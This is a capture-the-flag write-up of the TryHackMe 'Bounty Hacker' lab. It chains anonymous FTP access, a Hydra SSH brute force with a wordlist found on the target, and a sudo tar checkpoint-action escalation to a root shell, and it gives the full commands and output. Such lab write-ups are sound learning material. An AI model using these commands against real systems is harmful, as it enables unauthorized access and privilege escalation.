# Bounty Hacker
**Platform:** TryHackMe
**Difficulty:** Easy
**Category:** General
**Completed:** March 2026
**Author:** Jay Patel

## Room Summary

A beginner-level Linux box themed around the anime Cowboy Bebop. No
credentials are given upfront: everything is found through enumeration.
The attack path chains FTP anonymous access, a wordlist found on the
server itself, SSH brute force using that wordlist, and a tar-based
sudo privilege escalation.

The structure is similar to Simple CTF: FTP leaks the username, brute
force gets you in, sudo misconfiguration gets you root. The key difference
here is the password wordlist is sitting on the target machine itself via
FTP, and privesc uses `tar` instead of `vim`. Both are GTFOBins sudo abuse: same concept, different binary.

---

## Attack Chain Overview

```
Nmap → FTP anonymous login → locks.txt + task.txt → username: lin
Hydra → SSH brute force with locks.txt → user shell
sudo -l → /bin/tar → GTFOBins → root shell
```

---

## Step 1: Initial Nmap Scan

**Goal:** Discover all open services on the target before deciding where
to attack.

```bash
nmap -sC -sV -oN nmap_bounty.txt 10.10.x.x
```

**Flag breakdown:**

| Flag | Purpose |
|---|---|
| `-sC` | Default NSE scripts: banner grabbing, anonymous FTP check |
| `-sV` | Version detection: exact software version on each port |
| `-oN` | Save output to file: always save scan results |

**Output:**
```
kali@kali:~$ nmap -sC -sV -oN nmap_bounty.txt 10.10.x.x

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu0.8
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Site doesn't have a title
```

**What each service tells you:**

| Port | Service | Key Detail | Next Action |
|---|---|---|---|
| 21 | FTP vsftpd 3.0.3 | Anonymous login allowed | Log in immediately and grab all files |
| 22 | SSH OpenSSH 7.2p2 | Standard port | Brute force target once username found |
| 80 | HTTP Apache 2.4.18 | No page title | Enumerate: likely static or low value |

Anonymous FTP is flagged directly in the Nmap output via the `ftp-anon`
NSE script. When Nmap tells you this: act on it immediately before
doing anything else.

---

## Step 2: FTP Anonymous Login

**Goal:** Log in anonymously and retrieve every file available.

```bash
kali@kali:~$ ftp 10.10.x.x
Connected to 10.10.x.x.
220 (vsFTPd 3.0.3)
Name (10.10.x.x:kali): anonymous
Password:
230 Login successful.
```

```bash
ftp> ls
```

**Output:**
```
-rw-rw-r--    1 ftp      ftp       418 Jun 07  2020 locks.txt
-rw-rw-r--    1 ftp      ftp        68 Jun 07  2020 task.txt
```

```bash
ftp> mget *
ftp> bye
```

`mget *` downloads everything in the directory in one command: faster
than running `get` on each file individually.

**Read both files:**
```bash
kali@kali:~$ cat task.txt
```

**Output:**
```
1.) Protect Vicious.
2.) Plan for Red Eye pickup on the moon.

-lin
```

```bash
kali@kali:~$ cat locks.txt
```

**Output:**
```
rEddrAGON
ReDdr4g0nSynd!cat3
...
[long list of potential passwords]
...
RedDr4gonSynd1cat3
```

**What this gives you:**
The signature `-lin` at the bottom of task.txt directly reveals the
username. `locks.txt` is a wordlist of potential passwords: the target
handed you the exact wordlist needed to brute force its own SSH service.
Always read every file found on FTP, not just look for usernames.

---

## Step 3: Verify SSH Accepts Password Authentication

**Goal:** Confirm SSH will accept password-based login attempts before
running Hydra: avoids wasting time if key-only auth is enforced.

```bash
kali@kali:~$ nmap -p 22 --script ssh-auth-methods 10.10.x.x
```

**Output:**
```
22/tcp open  ssh
| ssh-auth-methods:
|   Supported authentication methods:
|     publickey
|     password
```

Password authentication is enabled. Try a wrong password manually to
confirm there is no lockout policy:

```bash
kali@kali:~$ ssh lin@10.10.x.x
lin@10.10.x.x's password: wrongpassword
Permission denied, please try again.
```

`Permission denied, please try again`: no lockout after wrong attempts.
Safe to run Hydra.

---

## Step 4: SSH Brute Force With Hydra

**Goal:** Crack lin's SSH password using the locks.txt wordlist found
on the FTP server.

```bash
kali@kali:~$ hydra -l lin -P locks.txt 10.10.x.x ssh -t 4
```

**Flag breakdown:**

| Flag | Value | Purpose |
|---|---|---|
| `-l lin` | Single username | Lowercase L: specify one known username |
| `-P locks.txt` | Wordlist | Password file recovered from FTP |
| `10.10.x.x` | Target | Machine IP |
| `ssh` | Protocol | Service to attack |
| `-t 4` | Threads | 4 parallel threads: safe default for SSH |

`-t 4` is the safe default for SSH brute forcing. Higher thread counts
can trigger rate limiting or crash unstable services: 4 is the balance
between speed and reliability.

**Output:**
```
kali@kali:~$ hydra -l lin -P locks.txt 10.10.x.x ssh -t 4

Hydra v9.1 (c) 2020 by van Hauser/THC
[DATA] attacking ssh://10.10.x.x:22/
[22][ssh] host: 10.10.x.x   login: lin   password: RedDr4gonSynd1cat3
1 of 1 target successfully completed, 1 valid password found
```

Credentials found: `lin:RedDr4gonSynd1cat3`

---

## Step 5: SSH Login and User Flag

**Goal:** Log in as lin and retrieve the user flag.

```bash
kali@kali:~$ ssh lin@10.10.x.x
lin@10.10.x.x's password: RedDr4gonSynd1cat3

Welcome to Ubuntu 16.04.7 LTS (GNU/Linux 4.15.0-101-generic x86_64)

lin@bountyhacker:~$ ls
Desktop  user.txt

lin@bountyhacker:~$ cat user.txt
```

User flag retrieved ✅

---

## Step 6: Privilege Escalation Enumeration

**Goal:** Find a path from lin to root.

```bash
lin@bountyhacker:~$ id
uid=1001(lin) gid=1001(lin) groups=1001(lin)

lin@bountyhacker:~$ sudo -l
```

**Output:**
```
Matching Defaults entries for lin on bountyhacker:
    env_reset, mail_badpass

User lin may run the following commands on bountyhacker:
    (root) /bin/tar
```

`/bin/tar` with `NOPASSWD`: no password required to run tar as root.
`sudo -l` is always the first privilege escalation check on any Linux
system. Any binary listed with `NOPASSWD` goes straight to GTFOBins.

---

## Step 7: Privilege Escalation via tar

**Goal:** Abuse sudo tar to spawn a root shell.
Reference: gtfobins.github.io → search tar → Sudo section.

```bash
lin@bountyhacker:~$ sudo tar -cf /dev/null /dev/null \
--checkpoint=1 \
--checkpoint-action=exec=/bin/sh
```

**Command breakdown:**

| Part | Purpose |
|---|---|
| `sudo tar` | Run tar as root |
| `-cf /dev/null /dev/null` | Dummy archive: output discarded immediately |
| `--checkpoint=1` | Trigger a checkpoint after every 1 record processed |
| `--checkpoint-action=exec=/bin/sh` | Execute /bin/sh at each checkpoint: as root |

**Output:**
```
# id
uid=0(root) gid=0(root) groups=0(root)

# cat /root/root.txt
```

Root flag retrieved ✅

tar can execute arbitrary commands during archive creation via the
`--checkpoint-action` flag. When tar runs as root via sudo, the shell
it spawns inherits root privileges. This is a clean one-liner: no exploit, no CVE required.

---

## Lessons Learned

The `mget *` discovery was practical: I had been using `get` on each
file individually in previous labs and did not know about the bulk
download command. Small things like this add up across a full engagement
where FTP directories might contain dozens of files.

The target handing you your own wordlist was the most unusual part of
this room. In a real environment this kind of situation does happen: a developer stores a password list or credentials file on a server
they administer, thinking it is internal-only, and it ends up accessible
via an FTP misconfiguration. It reinforces why every file on FTP gets
read in full regardless of what the filename suggests.

The tar privesc was new to me compared to the vim escalation from Simple
CTF. The `--checkpoint-action=exec` flag is not something you would
stumble across by accident: it shows why GTFOBins needs to be open on
every engagement. The binary itself is not dangerous, but a single
configuration option turns it into an arbitrary command executor.

---

## Full Attack Chain Reference

```
1.  nmap -sC -sV -oN nmap_bounty.txt <IP>
    → FTP(21), SSH(22), HTTP(80)
    → ftp-anon confirms anonymous login allowed

2.  ftp <IP> → anonymous login
    → mget * → task.txt (username: lin) + locks.txt (wordlist)

3.  nmap -p 22 --script ssh-auth-methods <IP>
    → password auth confirmed, no lockout

4.  hydra -l lin -P locks.txt <IP> ssh -t 4
    → lin:RedDr4gonSynd1cat3

5.  ssh lin@<IP>
    → user shell → user.txt ✅

6.  sudo -l
    → (root) NOPASSWD: /bin/tar

7.  sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
    → root shell → root.txt ✅
```

---

## Commands Reference

| Command | Purpose |
|---|---|
| `nmap -sC -sV -oN output.txt <IP>` | Full scan saving results to file |
| `ftp <IP>` then `anonymous` | Anonymous FTP login |
| `ftp> mget *` | Download all files in current directory |
| `ftp> bye` | Exit FTP |
| `nmap -p 22 --script ssh-auth-methods <IP>` | Check SSH auth methods |
| `hydra -l <user> -P <wordlist> <IP> ssh -t 4` | SSH brute force |
| `sudo -l` | Check sudo permissions: always first privesc step |
| `sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh` | Root via tar GTFOBins |
